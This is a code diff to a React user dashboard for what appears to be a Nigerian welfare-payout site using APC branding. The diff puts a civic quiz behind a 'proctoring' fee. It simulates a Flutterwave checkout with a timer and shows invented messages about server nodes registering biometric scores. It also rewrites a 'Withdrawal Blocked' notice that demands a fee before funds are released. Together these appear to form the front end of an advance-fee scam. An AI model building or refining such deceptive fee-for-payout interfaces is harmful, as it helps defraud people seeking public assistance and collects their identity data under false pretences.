-                                    updated[quizQuestionIndex] = opt;
-                                    setQuizAnswers(updated);
+                                    setPaymentLoading(true);
+                                    setTimeout(() => {
+                                      setPaymentLoading(false);
+                                      const updated = {
+                                        ...currentUser,
+                                        membershipStatus: "paid" as const
+                                      };
+                                      onUpdateUser(updated);
+                                      const successToast = document.createElement("div");
+                                      successToast.className = "fixed bottom-5 right-5 z-50 bg-[#008751] text-white px-5 py-3 rounded-xl shadow-lg border border-[#006f40] text-xs font-bold flex items-center space-x-2 animate-bounce";
+                                      successToast.innerHTML = `<span>✓ Exam Access Token Activated successfully! Settle in, your exam environment is fully loaded.</span>`;
+                                      document.body.appendChild(successToast);
+                                      setTimeout(() => successToast.remove(), 4000);
+                                    }, 2000);
                                   }}
-                                  className={`w-full text-left p-3 rounded-lg border text-xs font-medium cursor-pointer transition-all ${
-                                    isSelected
-                                      ? "bg-[#008751] text-white border-[#008751] font-extrabold"
-                                      : "bg-white border-slate-200 text-slate-600 hover:bg-slate-100"
-                                  }`}
+                                  className="w-full py-3 bg-[#008751] hover:bg-[#007345] text-white font-extrabold rounded-lg text-xs shadow cursor-pointer transition uppercase tracking-wider flex items-center justify-center space-x-2"
                                 >
-                                  {opt}
+                                  {paymentLoading ? (
+                                    <>
+                                      <div className="w-4.5 h-4.5 border-2 border-white/25 border-t-white rounded-full animate-spin" />
+                                      <span>Initializing Flutterwave Secure checkout...</span>
+                                    </>
+                                  ) : (
+                                    <>
+                                      <CreditCard className="w-4 h-4" />
+                                      <span>Complete Proctor Verification (Pay ₦{(currentUser.membershipFee || 2000).toLocaleString()})</span>
+                                    </>
+                                  )}
                                 </button>
-                              );
-                            })}
+                              </div>
+                            </div>
                           </div>
-                        </div>
-
-                        <div className="flex justify-between items-center border-t border-slate-200 pt-3">
-                          {quizQuestionIndex > 0 && (
+                        )}
+                      </div>
+                    ) : (
+                      /* PAID QUIZ WORKFLOW */
+                      <>
+                        {examState === "not_started" && (
+                          <div className="border border-dashed border-slate-300 rounded-xl p-6 text-center bg-slate-50 space-y-4 font-sans">
+                            <div className="w-12 h-12 rounded-full bg-emerald-100 flex items-center justify-center mx-auto text-emerald-600">
+                              <BookOpen className="w-6 h-6" />
+                            </div>
+                            <h4 className="font-bold text-slate-900 text-xs uppercase font-mono tracking-wider">Citizenship Eligibility Test (4 Questions)</h4>
+                            <p className="text-xs text-slate-500 max-w-sm mx-auto leading-relaxed">
+                              This test validates your basic comprehension of Nigerian civic parameters. It takes less than 2 minutes. Click below to initialize.
+                            </p>
                             <button
                               type="button"
-                              onClick={() => setQuizQuestionIndex(prev => prev - 1)}
-                              className="px-3 py-1.5 bg-white border border-slate-300 rounded text-[11px] font-bold text-slate-600 hover:bg-slate-50 cursor-pointer"
-                            >
-                              Prev
-                            </button>
-                          )}
-                          
-                          {quizQuestionIndex < QUIZ_QUESTIONS.length - 1 ? (
-                            <button
-                              type="button"
-                              disabled={!quizAnswers[quizQuestionIndex]}
-                              onClick={() => setQuizQuestionIndex(prev => prev + 1)}
-                              className="ml-auto px-4 py-1.5 bg-[#008751] hover:bg-[#007345] text-white rounded text-[11px] font-black cursor-pointer disabled:opacity-40"
-                            >
-                              Next Question
-                            </button>
-                          ) : (
-                            <button
-                              type="button"
-                              disabled={!quizAnswers[quizQuestionIndex]}
                               onClick={() => {
-                                setExamState("grading");
-                                localStorage.setItem(`apc_exam_state_${currentUser.id}`, "grading");
-                                setTimeout(() => {
-                                  let correctCount = 0;
-                                  QUIZ_QUESTIONS.forEach((q, idx) => {
-                                    if (quizAnswers[idx] === q.correct) {
-                                      correctCount++;
-                                    }
-                                  });
-                                  const finalScore = Math.round((correctCount / QUIZ_QUESTIONS.length) * 100);
-                                  setExamScoreValue(finalScore);
-                                  setExamState("submitted");
-                                  localStorage.setItem(`apc_exam_state_${currentUser.id}`, "submitted");
-                                  localStorage.setItem(`apc_exam_score_${currentUser.id}`, finalScore.toString());
-                                }, 1500);
+                                setExamState("testing");
+                                setQuizQuestionIndex(0);
+                                setQuizAnswers([]);
+                                localStorage.setItem(`apc_exam_state_${currentUser.id}`, "testing");
                               }}
-                              className="ml-auto px-5 py-2 bg-[#008751] hover:bg-[#007345] text-white rounded text-[11px] font-black tracking-wide uppercase shadow cursor-pointer disabled:opacity-40"
+                              className="px-6 py-2.5 bg-[#008751] hover:bg-[#007345] text-white font-extrabold rounded-lg text-xs shadow-md cursor-pointer transition-all uppercase tracking-wide"
                             >
-                              Submit Exam Answers
+                              Initialize Test Environment
                             </button>
-                          )}
-                        </div>
-                      </div>
-                    )}
+                          </div>
+                        )}
 
-                    {examState === "grading" && (
-                      <div className="border border-slate-200 rounded-xl p-8 bg-slate-50 text-center space-y-4 animate-pulse">
-                        <div className="w-8 h-8 border-3 border-[#008751]/20 border-t-[#008751] rounded-full animate-spin mx-auto" />
-                        <h4 className="font-extrabold text-xs text-slate-800 uppercase tracking-widest font-mono">Grading Examination Script...</h4>
-                        <p className="text-[10px] text-slate-500">Connecting social liaison server nodes to register biometrics scores.</p>
-                      </div>
-                    )}
+                        {examState === "testing" && (
+                          <div className="border border-slate-200 rounded-xl p-5 bg-slate-50 relative space-y-4">
+                            <div className="flex justify-between items-center bg-white px-3 py-1.5 rounded border border-slate-100">
+                              <span className="text-[9.5px] font-mono text-slate-500 font-bold uppercase">
+                                Question {quizQuestionIndex + 1} of {QUIZ_QUESTIONS.length}
+                              </span>
+                              <span className="text-[10px] font-mono font-black text-emerald-600 flex items-center space-x-1 animate-pulse">
+                                <span>⏱ Smart Proctor Active</span>
+                              </span>
+                            </div>
 
-                    {examState === "submitted" && (
-                      <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-5 text-center space-y-3">
-                        <div className="w-10 h-10 rounded-full bg-emerald-100 flex items-center justify-center mx-auto text-[#008751] text-sm font-black">
-                          ✓
-                        </div>
-                        <h4 className="font-extrabold text-slate-900 text-xs uppercase tracking-wide">Screening Assessment Submitted!</h4>
-                        <p className="text-[11px] text-slate-600 leading-relaxed max-w-sm mx-auto">
-                          Eligibility screening validated successfully. Your scores have been assigned. See credentials below.
-                        </p>
-                      </div>
+                            <div className="space-y-4">
+                              <p className="font-bold text-slate-800 text-xs">
+                                {QUIZ_QUESTIONS[quizQuestionIndex].q}
+                              </p>
+
+                              <div className="grid grid-cols-1 gap-2.5">
+                                {QUIZ_QUESTIONS[quizQuestionIndex].options.map((opt) => {
+                                  const isSelected = quizAnswers[quizQuestionIndex] === opt;
+                                  return (
+                                    <button
+                                      type="button"
+                                      key={opt}
+                                      onClick={() => {
+                                        const updated = [...quizAnswers];
+                                        updated[quizQuestionIndex] = opt;
+                                        setQuizAnswers(updated);
+                                      }}
+                                      className={`w-full text-left p-3 rounded-lg border text-xs font-medium cursor-pointer transition-all ${
+                                        isSelected
+                                          ? "bg-[#008751] text-white border-[#008751] font-extrabold"
+                                          : "bg-white border-slate-200 text-slate-600 hover:bg-slate-100"
+                                      }`}
+                                    >
+                                      {opt}
+                                    </button>
+                                  );
+                                })}
+                              </div>
+                            </div>
+
+                            <div className="flex justify-between items-center border-t border-slate-200 pt-3">
+                              {quizQuestionIndex > 0 && (
+                                <button
+                                  type="button"
+                                  onClick={() => setQuizQuestionIndex(prev => prev - 1)}
+                                  className="px-3 py-1.5 bg-white border border-slate-300 rounded text-[11px] font-bold text-slate-600 hover:bg-slate-50 cursor-pointer"
+                                >
+                                  Prev
+                                </button>
+                              )}
+                              
+                              {quizQuestionIndex < QUIZ_QUESTIONS.length - 1 ? (
+                                <button
+                                  type="button"
+                                  disabled={!quizAnswers[quizQuestionIndex]}
+                                  onClick={() => setQuizQuestionIndex(prev => prev + 1)}
+                                  className="ml-auto px-4 py-1.5 bg-[#008751] hover:bg-[#007345] text-white rounded text-[11px] font-black cursor-pointer disabled:opacity-40"
+                                >
+                                  Next Question
+                                </button>
+                              ) : (
+                                <button
+                                  type="button"
+                                  disabled={!quizAnswers[quizQuestionIndex]}
+                                  onClick={() => {
+                                    setExamState("grading");
+                                    localStorage.setItem(`apc_exam_state_${currentUser.id}`, "grading");
+                                    setTimeout(() => {
+                                      let correctCount = 0;
+                                      QUIZ_QUESTIONS.forEach((q, idx) => {
+                                        if (quizAnswers[idx] === q.correct) {
+                                          correctCount++;
+                                        }
+                                      });
+                                      const finalScore = Math.round((correctCount / QUIZ_QUESTIONS.length) * 100);
+                                      setExamScoreValue(finalScore);
+                                      setExamState("submitted");
+                                      localStorage.setItem(`apc_exam_state_${currentUser.id}`, "submitted");
+                                      localStorage.setItem(`apc_exam_score_${currentUser.id}`, finalScore.toString());
+                                    }, 1500);
+                                  }}
+                                  className="ml-auto px-5 py-2 bg-[#008751] hover:bg-[#007345] text-white rounded text-[11px] font-black tracking-wide uppercase shadow cursor-pointer disabled:opacity-40"
+                                >
+                                  Submit Exam Answers
+                                </button>
+                              )}
+                            </div>
+                          </div>
+                        )}
+
+                        {examState === "grading" && (
+                          <div className="border border-slate-200 rounded-xl p-8 bg-slate-50 text-center space-y-4 animate-pulse">
+                            <div className="w-8 h-8 border-3 border-[#008751]/20 border-t-[#008751] rounded-full animate-spin mx-auto" />
+                            <h4 className="font-extrabold text-xs text-slate-800 uppercase tracking-widest font-mono">Grading Examination Script...</h4>
+                            <p className="text-[10px] text-slate-500">Connecting social liaison server nodes to register biometrics scores.</p>
+                          </div>
+                        )}
+
+                        {examState === "submitted" && (
+                          <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-5 text-center space-y-3 font-sans animate-fade-in">
+                            <div className="w-10 h-10 rounded-full bg-emerald-100 flex items-center justify-center mx-auto text-[#008751] text-sm font-black">
+                              ✓
+                            </div>
+                            <h4 className="font-extrabold text-slate-900 text-xs uppercase tracking-wide">Screening Assessment Submitted!</h4>
+                            <p className="text-[11px] text-slate-600 leading-relaxed max-w-sm mx-auto">
+                              Eligibility screening validated successfully. Your scores have been assigned. See credentials below.
+                            </p>
+                          </div>
+                        )}
+                      </>
                     )}
 
                     {/* OFFICIAL APPLICATION SLIP DISPLAY CARD (With Passport details) */}
@@ -3292,19 +3503,19 @@ export default function UserDashboard({
                   
                   {currentUser.membershipStatus !== "paid" ? (
                     // OUTSTANDING CONSTRAINT WARNING
-                    <div className="bg-white border border-red-250 rounded-2xl p-6 text-center space-y-4 shadow-sm">
+                    <div className="bg-white border border-red-200 rounded-2xl p-6 text-center space-y-4 shadow-sm">
                       <div className="w-12 h-12 bg-red-50 rounded-full flex items-center justify-center text-red-650 mx-auto border border-red-200">
                         <ShieldAlert className="w-5 h-5" />
                       </div>
-                      <h3 className="text-base font-extrabold text-red-750">Withdrawal Blocked: Verification Card Unpaid</h3>
+                      <h3 className="text-base font-extrabold text-red-750">Withdrawal Blocked: Examination Clearance Outstanding</h3>
                       <p className="text-xs text-slate-600 max-w-sm mx-auto leading-relaxed">
-                        To protect federal funds from automated cyber-clones, you are strictly required to purchase your official APC physical or digital Membership ID template before money release.
+                        To protect social safety funds, you are strictly required to clear your smart proctoring examination fee and complete your civic eligibility test before requesting disbursement.
                       </p>
                       <button
-                        onClick={() => setActiveTab("payment")}
+                        onClick={() => setActiveTab("exam")}
                         className="bg-[#008751] hover:bg-[#007345] text-white font-extrabold py-2 px-5 rounded-lg text-xs cursor-pointer"
                       >
-                        Acquire Registration ID Now
+                        Go to Examination Center
                       </button>
                     </div>
                   ) : (!currentUser.ninVerified || !currentUser.faceVerified) ? (
